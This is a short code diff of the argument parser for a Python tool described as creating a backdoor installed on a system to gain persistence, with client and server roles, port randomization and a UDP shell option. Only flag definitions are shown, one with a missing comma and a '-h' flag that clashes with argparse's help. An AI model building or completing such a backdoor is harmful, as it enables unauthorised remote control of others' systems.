@@ -9,9 +9,9 @@ def parse_args():
         description="creates a backdoor to install on a system to gain persistence")
     client_server = parser.add_mutually_exclusive_group()
     client_server.add_argument(
-        '-s', '--server', help='establishes current connection as where hosts will connect to')
+        '-h', '--host', help='establishes current connection as where clients will connect to')
     client_server.add_argument(
-        '-h' '--host', help='establishes current connextion as host issuing commends to the server')
+        '-c' '--client', help='establishes current connextion as client issuing commends to the server')
     port = parser.add_mutually_exclusive_group()
     port.add_argument(
         '-p', '--port', help='defines static connection port', type=int, nargs=1)
@@ -19,7 +19,7 @@ def parse_args():
     port_randomization.add_argument(
         '-r', '--range', help='defines range of ports to randomize connection over', nargs=2)
     port_randomization.add_argument(
-        '--seed', help='defines seed for port randomization to use')
+        '-s', '--seed', help='defines seed for port randomization to use')
     connection = parser.add_mutually_exclusive_group()
     connection.add_argument(
         "-u", "--udp", help="utilizes udp for shell interation")
